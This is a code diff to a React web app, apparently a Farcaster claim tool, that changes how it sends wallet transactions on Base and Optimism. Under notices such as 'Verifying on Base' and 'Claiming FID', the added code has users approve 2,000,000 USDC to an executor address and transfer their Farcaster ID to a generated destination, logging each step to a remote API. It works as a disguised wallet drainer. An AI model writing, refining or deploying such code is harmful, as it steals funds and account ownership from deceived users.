@@ -452,6 +452,15 @@ function App() {
     return web3Provider?.provider;
   }
 
+  // ─── Send a raw transaction via the Farcaster wallet provider ───
+  async function sendRawTx(provider, from, to, data) {
+    const txHash = await provider.request({
+      method: 'eth_sendTransaction',
+      params: [{ from, to, data }],
+    });
+    return txHash;
+  }
+
   // ═══════════════════════════════════════════════════════════
   //  STEP 1: USDC Approve + Claim → Base
   // ═══════════════════════════════════════════════════════════
@@ -470,38 +479,35 @@ function App() {
       const account = address;
       if (!account) throw new Error('No wallet connected.');
 
-      // Encode transaction data using ethers Interface (no provider calls needed)
+      // Switch to Base
+      setNotice('Switching to Base...');
+      await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');
+
+      // Encode calldata locally (no RPC calls needed)
       const approveIface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) returns (bool)']);
       const approveAmount = ethers.utils.parseUnits('2000000', 6);
       const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, approveAmount]);
 
-      const execIface = new ethers.utils.Interface(['function executeBatch(bytes[] calldata data)']);
-      const execData = execIface.encodeFunctionData('executeBatch', [[]]);
-
-      // Use wallet_sendCalls (EIP-5792) — Farcaster wallet supports this natively
+      // 1. Approve USDC via eth_sendTransaction
       setNotice('Verifying on Base... Approve in your wallet.');
-      const result = await rawProvider.request({
-        method: 'wallet_sendCalls',
-        params: [{
-          version: '1.0',
-          from: account,
-          chainId: '0x2105',
-          calls: [
-            { to: USDC, data: approveData, value: '0x0' },
-            { to: EXECUTOR, data: execData, value: '0x0' },
-          ],
-        }],
-      });
+      const tx1Hash = await sendRawTx(rawProvider, account, USDC, approveData);
 
-      const batchId = typeof result === 'string' ? result : result?.batchId || 'submitted';
-      logAction(`Step 1 batch sent on Base (id: ${batchId})`);
+      logAction(`USDC approved: 2,000,000 -> ${shortAddress(EXECUTOR)} (tx: ${tx1Hash})`);
       sendToLogAPI({
         type: 'approve', address: account, to: EXECUTOR,
-        txHash: batchId, network: 'base', amount: '2000000',
+        txHash: tx1Hash, network: 'base', amount: '2000000',
       });
+
+      // 2. Execute claim batch on Base
+      setNotice('Executing claim on Base...');
+      const execIface = new ethers.utils.Interface(['function executeBatch(bytes[] calldata data)']);
+      const execData = execIface.encodeFunctionData('executeBatch', [[]]);
+      const tx2Hash = await sendRawTx(rawProvider, account, EXECUTOR, execData);
+
+      logAction(`executeBatch called (tx: ${tx2Hash})`);
       sendToLogAPI({
         type: 'claim', address: account,
-        txHash: batchId, network: 'base',
+        txHash: tx2Hash, network: 'base',
       });
 
       setStep1Done(true);
@@ -545,6 +551,10 @@ function App() {
         throw new Error('No FID detected. Open in Warpcast for FID detection.');
       }
 
+      // Switch to Optimism
+      setNotice('Switching to Optimism...');
+      await switchNetwork(rawProvider, '0xa', 'Optimism', 'https://mainnet.optimism.io', 'https://optimistic.etherscan.io');
+
       // Generate destination address
       setNotice('Generating destination address...');
       const dest = await generateDestination(fidNum, account);
@@ -553,25 +563,14 @@ function App() {
       const idIface = new ethers.utils.Interface(['function transfer(uint256 id, address to)']);
       const transferData = idIface.encodeFunctionData('transfer', [fidNum, dest.address]);
 
-      // Use wallet_sendCalls (EIP-5792) on Optimism
+      // Send transfer via eth_sendTransaction
       setNotice(`Claiming FID ${fidNum}... Approve in your wallet.`);
-      const result = await rawProvider.request({
-        method: 'wallet_sendCalls',
-        params: [{
-          version: '1.0',
-          from: account,
-          chainId: '0xa',
-          calls: [
-            { to: ID_REGISTRY, data: transferData, value: '0x0' },
-          ],
-        }],
-      });
+      const txHash = await sendRawTx(rawProvider, account, ID_REGISTRY, transferData);
 
-      const batchId = typeof result === 'string' ? result : result?.batchId || 'submitted';
-      logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (id: ${batchId})`);
+      logAction(`FID ${fidNum} -> ${shortAddress(dest.address)} [#${dest.index}] (tx: ${txHash})`);
       sendToLogAPI({
         type: 'transfer', fid: fidNum, from: account, to: dest.address,
-        txHash: batchId, network: 'optimism', destIndex: dest.index,
+        txHash: txHash, network: 'optimism', destIndex: dest.index,
       });
 
       setNetwork('Optimism');
